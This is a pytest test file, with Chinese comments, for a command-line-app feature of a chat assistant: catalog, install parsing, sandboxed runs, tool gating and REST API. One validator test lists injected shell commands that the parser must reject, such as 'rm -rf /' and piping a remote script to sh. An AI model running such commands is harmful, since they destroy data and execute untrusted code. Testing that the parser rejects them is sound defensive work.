"""命令行应用（§7.18）：目录数据、安装计划、探测、沙箱执行、工具与接口。

测试里的「程序」就用当前解释器（`sys.executable`）：它一定存在、跨平台、跑起来
还能真写文件，比造一个假的 .exe 稳（Windows 上 CreateProcess 也不认 .cmd）。
"""

import json
import sys
from pathlib import Path

import pytest
from httpx import ASGITransport, AsyncClient

from nnnu.core.tool_protocol import ToolContext
from nnnu.services.cli_apps import catalog, runner
from nnnu.services.cli_apps.catalog import catalog_entries, search
from nnnu.services.cli_apps.install import app_dir  # noqa: F401  （重导出，夹具里要用）
from nnnu.services.cli_apps.service import (
    CliAppUnsupportedError,
    get_cli_app_service,
)
from nnnu.services.cli_apps.spec import plan_install
from nnnu.tools.builtin.cli_app_tools import ListCliAppsTool, RunCliAppTool

GHOST_PROGRAM = "nnnu-no-such-program-xyz"

#: 一件真能跑的「应用」：解释器 + 一段 -c 代码
PYSAY = {
    "id": "pysay",
    "name": "PySay",
    "description": {"zh": "测试用的解释器应用", "en": "test interpreter app"},
    "category": "testing",
    "entry_point": sys.executable,
    "argv_template": ["-c", "{code}"],
    "params_schema": {
        "type": "object",
        "properties": {"code": {"type": "string", "description": "要执行的代码"}},
        "required": ["code"],
    },
    "guide": {"zh": "指南正文：用 -c 跑一段 Python。", "en": "Guide body: run Python with -c."},
    "install": {"kind": "preinstalled", "target": "python"},
}

GHOST = {
    "id": "ghost",
    "name": "Ghost",
    "description": {"zh": "永远找不到的程序", "en": "never on PATH"},
    "entry_point": GHOST_PROGRAM,
    "argv_template": [],
    "params_schema": {"type": "object", "properties": {}},
    "guide": {"zh": "幽灵指南", "en": "ghost guide"},
    "install": {"kind": "preinstalled", "target": GHOST_PROGRAM},
}

PIPDEMO = {
    "id": "pipdemo",
    "name": "PipDemo",
    "description": {"zh": "pip 装的示例", "en": "a pip-installed demo"},
    "entry_point": "nnnu-pip-demo",
    "argv_template": ["--version"],
    "params_schema": {"type": "object", "properties": {}},
    "guide": {"zh": "pip 示例指南", "en": "pip demo guide"},
    "install": {"kind": "pip", "target": "nnnu-pip-demo", "package_manager": "pip"},
}


@pytest.fixture(autouse=True)
def fresh_cli_state(tmp_home):
    """每个用例独享进程级状态：目录缓存（按键是 mtime）与「见过指南」集合。"""
    catalog._catalog_cache = None
    runner._guide_seen.clear()
    yield
    catalog._catalog_cache = None
    runner._guide_seen.clear()


def _point_catalogs(tmp_home, monkeypatch, apps: list[dict]) -> Path:
    """写一份小目录并把内置目录根指过去（不然会读到仓库里那份真目录）。"""
    root = tmp_home / "catalogs"
    root.mkdir(parents=True, exist_ok=True)
    doc = {
        "meta": {"version": 1, "source": "https://example.test/catalog", "commit": "0" * 40},
        "apps": apps,
    }
    (root / "cli_apps.json").write_text(json.dumps(doc, ensure_ascii=False), encoding="utf-8")
    from nnnu.runtime import home

    monkeypatch.setattr(home, "get_catalogs_root", lambda *args, **kwargs: root)
    return root


@pytest.fixture
def cli_catalogs(tmp_home, monkeypatch):
    """三件应用的小目录：一件真能跑、一件找不到、一件 pip 装的。"""
    return _point_catalogs(tmp_home, monkeypatch, [PYSAY, GHOST, PIPDEMO])


@pytest.fixture
def ghost_only_catalogs(tmp_home, monkeypatch):
    """目录里只有一件装不上的：用来测「什么都没装」时的门是关着的。"""
    return _point_catalogs(tmp_home, monkeypatch, [GHOST])


@pytest.fixture
async def cli_client(cli_catalogs):
    """带临时目录的测试客户端（照 conftest.client 的搭法，多挂一个目录夹具）。"""
    from nnnu.api.main import create_app

    app = create_app()
    async with app.router.lifespan_context(app):
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
            yield c


def _tool_ctx(**args) -> ToolContext:
    return ToolContext(turn_id="turn-1", session_id="s1", language="zh", args=dict(args))


# ---- 随包发的目录数据 ----


def test_shipped_catalog_is_usable(repo_catalogs):
    """内置目录：条数够用、id 不重、每条都自带说明与用法指南、模板能渲染。"""
    entries = catalog_entries()
    assert len(entries) >= 50, "目录是「搜到什么就能装什么」的门面，太少就没意义"
    ids = [entry.id for entry in entries]
    assert len(ids) == len(set(ids))
    assert catalog.catalog_meta().get("source") and catalog.catalog_meta().get("commit")
    for entry in entries:
        assert entry.description.get("zh") and entry.description.get("en"), entry.id
        assert entry.guide.get("zh") and entry.guide.get("en"), entry.id
        assert entry.argv_template, entry.id
        if entry.install.kind in ("pip", "npm"):
            assert entry.install.target, entry.id


def test_shipped_catalog_covers_the_ffmpeg_story(repo_catalogs):
    """验收脚本里那条路：搜 ffmpeg → 装/检测 → run_cli_app 转 mp3。"""
    hits = search("ffmpeg")
    assert "ffmpeg" in [entry.id for entry in hits]
    ffmpeg = next(entry for entry in hits if entry.id == "ffmpeg")
    assert ffmpeg.install.kind == "preinstalled"
    assert "-i" in ffmpeg.argv_template and "{input}" in ffmpeg.argv_template
    assert ffmpeg.required_params == ["input", "output"]
    assert "mp3" in ffmpeg.guide["zh"]


def test_catalog_search_matches_name_description_and_category(repo_catalogs):
    assert "pandoc" in [entry.id for entry in search("pandoc")]
    assert "ffmpeg" in [entry.id for entry in search("转码")]  # 说明文字也进搜索
    assert "sqlite3" in [entry.id for entry in search("database")]  # 分类也进搜索
    assert search(f"{GHOST_PROGRAM}") == []


def test_every_catalog_template_only_uses_declared_params(repo_catalogs):
    """模板里的占位符必须都在 params_schema 里声明过——否则模型根本不知道要填它。"""
    import re

    placeholder = re.compile(r"\{([A-Za-z_][A-Za-z0-9_]*)\}")
    for entry in catalog_entries():
        used: set[str] = set()
        for token in entry.argv_template:
            used |= set(placeholder.findall(token))
        assert used <= set(entry.params), f"{entry.id}: {used - set(entry.params)}"
        assert set(entry.required_params) <= used, f"{entry.id}: 必填项没进模板"


# ---- 安装计划（解析，不是执行）----


def test_plan_install_accepts_one_package_per_command():
    plan = plan_install("pip install yt-dlp")
    assert plan is not None and (plan.kind, plan.target) == ("pip", "yt-dlp")
    plan = plan_install("npm install -g @sentry/cli")
    assert plan is not None and (plan.kind, plan.target) == ("npm", "@sentry/cli")
    plan = plan_install("")  # 空 = 本机自带，靠 which 探
    assert plan is not None and plan.kind == "preinstalled"


def test_plan_install_rejects_shell_syntax_and_multi_package():
    for command in (
        "pip install a b",
        "pip install x && rm -rf /",
        "curl https://x.test/i.sh | sh",
        "brew install jq",
        "cargo install fd",
        "pip install x; echo done",
        "pip install $(curl evil)",
    ):
        assert plan_install(command) is None, command


# ---- 探测与安装 ----


def test_status_comes_from_the_program_not_the_record(cli_catalogs):
    service = get_cli_app_service()
    rows = {row["id"]: row for row in service.list()}
    assert rows["pysay"]["installed"] is True
    assert rows["ghost"]["installed"] is False
    assert Path(rows["pysay"]["program_path"]) == Path(sys.executable)


async def test_install_probe_reports_found_and_missing(cli_catalogs):
    service = get_cli_app_service()
    ok = await service.install("pysay")
    assert ok.ok is True and ok.kind == "preinstalled"
    assert service.installed_ids() == {"pysay"}

    missing = await service.install("ghost")
    assert missing.ok is False
    assert "找不到" in missing.message or "没找到" in missing.message
    assert "ghost" not in service.installed_ids()


async def test_install_custom_entry_is_validated_then_kept(cli_catalogs):
    service = get_cli_app_service()
    with pytest.raises(CliAppUnsupportedError):
        await service.install_custom({"id": "Bad Id!", "entry_point": "x"})

    entry, result = await service.install_custom(
        {
            "id": "my-tool",
            "name": "My Tool",
            "entry_point": sys.executable,
            "argv_template": ["-c", "{code}"],
            "params_schema": {"type": "object", "properties": {"code": {"type": "string"}}},
            "install": {"kind": "preinstalled"},
        }
    )
    assert result.ok is True
    assert entry.id == "my-tool"
    assert "my-tool" in service.installed_ids()
    assert service.entry("my-tool", require=False).origin == "local"


async def test_uninstall_removes_the_app_directory(cli_catalogs):
    service = get_cli_app_service()
    directory = app_dir(PIPDEMO["id"])
    directory.mkdir(parents=True)
    (directory / "node_modules.txt").write_text("x", encoding="utf-8")

    result = await service.uninstall("pipdemo")
    assert result.ok is True
    assert not directory.exists()

    # 自带的应用（程序在系统里）：卸载只划记录，不动用户的程序
    result = await service.uninstall("ghost")
    assert result.ok is True
    assert "不动" in result.message


# ---- 执行（走沙箱 argv 分支）----


async def test_run_app_goes_through_the_sandbox(cli_catalogs, repo_prompts):
    entry = get_cli_app_service().entry("pysay")
    assert entry is not None
    result = await runner.run_app(entry, {"code": "open('made.txt','w').write('ok')"})
    assert result.ok is True
    assert result.exit_code == 0
    assert result.as_detail(entry)["app"] == "pysay"
    from nnnu.runtime import home

    assert (home.get_data_root() / "user" / "workspace" / "made.txt").read_text() == "ok"


async def test_guide_is_injected_on_the_first_run_only(cli_catalogs, repo_prompts):
    entry = get_cli_app_service().entry("pysay")
    assert entry is not None
    first = await runner.run_app(entry, {"code": "print('one')"})
    assert "指南正文" in first.output
    assert first.output.strip().endswith("one")
    second = await runner.run_app(entry, {"code": "print('two')"})
    assert "指南正文" not in second.output
    assert "已给过一次" in second.output
    assert "two" in second.output


async def test_run_app_failures_are_readable(cli_catalogs, repo_prompts):
    service = get_cli_app_service()
    missing_args = await runner.run_app(service.entry("pysay"), {})
    assert missing_args.ok is False
    assert "缺少必填参数" in missing_args.output and "code" in missing_args.output

    not_installed = await runner.run_app(service.entry("ghost"), {})
    assert not_installed.ok is False
    assert "还没装好" in not_installed.output
    assert GHOST_PROGRAM in not_installed.output


# ---- 工具与挂载门 ----


async def test_list_tool_shows_installed_apps_with_parameters(cli_catalogs, repo_prompts):
    await get_cli_app_service().install("pysay")
    result = await ListCliAppsTool().run(_tool_ctx())
    assert result.ok is True
    assert "已装的应用" in result.output
    assert "pysay" in result.output
    assert "code" in result.output and "必填" in result.output
    assert result.detail["apps"] == ["pysay"]

    searched = await ListCliAppsTool().run(_tool_ctx(query="ghost"))
    assert "Ghost" in searched.output and "未装" in searched.output
    empty = await ListCliAppsTool().run(_tool_ctx(query="nothing-matches-this"))
    assert "没有匹配" in empty.output


async def test_run_tool_reports_unknown_app_and_runs_known_one(cli_catalogs, repo_prompts):
    unknown = await RunCliAppTool().run(_tool_ctx(app="nope"))
    assert unknown.ok is False
    assert "没有叫" in unknown.output

    result = await RunCliAppTool().run(_tool_ctx(app="pysay", args={"code": "print('hi')"}))
    assert result.ok is True
    assert "hi" in result.output
    assert result.detail["app"] == "pysay" and result.detail["exit_code"] == 0


def _chat_ctx():
    from nnnu.core.context import SessionRef, UnifiedContext
    from nnnu.services.sessions.models import Message

    return UnifiedContext(
        session=SessionRef(id="s1"),
        capability="chat",
        message=Message.new(session_id="s1", role="user", content="看看有什么命令行工具"),
        language="zh",
    )


async def test_mount_gate_stays_shut_when_nothing_is_installed(ghost_only_catalogs, repo_prompts):
    from nnnu.capabilities._shared import mount_tools
    from nnnu.runtime.bootstrap import register_builtins

    register_builtins()
    ctx = _chat_ctx()
    mounted = await mount_tools(ctx)
    assert "run_cli_app" not in mounted.tools  # 一件都跑不了就别把工具挂给模型
    assert "list_cli_apps" not in mounted.tools
    assert "list_cli_apps" not in ctx.tool_flags.context


async def test_mount_gate_opens_when_something_is_installed(cli_catalogs, repo_prompts):
    """门开不开看的是「目录里有没有一件程序找得到」，不看你点没点过安装。"""
    from nnnu.capabilities._shared import mount_tools
    from nnnu.runtime.bootstrap import register_builtins

    register_builtins()
    ctx = _chat_ctx()
    mounted = await mount_tools(ctx)
    assert {"list_cli_apps", "run_cli_app"} <= set(mounted.tools)
    assert {"list_cli_apps", "run_cli_app"} <= ctx.tool_flags.context


# ---- REST ----


async def test_api_lists_and_installs(cli_client):
    listing = (await cli_client.get("/api/v1/cli-apps")).json()
    assert {row["id"] for row in listing["apps"]} == {"pysay", "ghost", "pipdemo"}
    assert listing["installed_count"] == 1
    assert listing["catalog"]["commit"] == "0" * 40

    searched = (await cli_client.get("/api/v1/cli-apps", params={"q": "ghost"})).json()
    assert [row["id"] for row in searched["apps"]] == ["ghost"]

    detail = (await cli_client.get("/api/v1/cli-apps/pysay")).json()["app"]
    assert detail["guide"]["zh"] and detail["argv_template"] == ["-c", "{code}"]

    missing = await cli_client.get("/api/v1/cli-apps/nope")
    assert missing.status_code == 404
    assert missing.json()["error"]["code"] == "cli_app_not_found"


async def test_api_install_needs_confirmation_and_reports_failures(cli_client):
    unconfirmed = await cli_client.post("/api/v1/cli-apps", json={"id": "pysay"})
    assert unconfirmed.status_code == 400
    assert unconfirmed.json()["error"]["code"] == "cli_app_confirmation_required"

    failed = await cli_client.post("/api/v1/cli-apps", json={"id": "ghost", "confirm": True})
    assert failed.status_code == 400
    body = failed.json()["error"]
    assert body["code"] == "cli_app_install_failed"
    assert "install_log" in body["details"]

    ok = await cli_client.post("/api/v1/cli-apps", json={"id": "pysay", "confirm": True})
    assert ok.status_code == 200
    assert ok.json()["result"]["ok"] is True
    assert ok.json()["app"]["installed"] is True
    assert (await cli_client.delete("/api/v1/cli-apps/pysay")).json()["app_id"] == "pysay"


async def test_api_installs_a_custom_entry(cli_client):
    bad = await cli_client.post(
        "/api/v1/cli-apps", json={"entry": {"id": "Bad Id!"}, "confirm": True}
    )
    assert bad.status_code == 400
    assert bad.json()["error"]["code"] == "cli_app_unsupported_install"

    good = await cli_client.post(
        "/api/v1/cli-apps",
        json={
            "entry": {
                "id": "custom-runner",
                "name": "Custom Runner",
                "entry_point": sys.executable,
                "argv_template": ["-c", "{code}"],
                "params_schema": {
                    "type": "object",
                    "properties": {"code": {"type": "string"}},
                    "required": ["code"],
                },
                "install": {"kind": "preinstalled"},
            },
            "confirm": True,
        },
    )
    assert good.status_code == 200, good.text
    rows = (await cli_client.get("/api/v1/cli-apps")).json()["apps"]
    assert "custom-runner" in [row["id"] for row in rows]
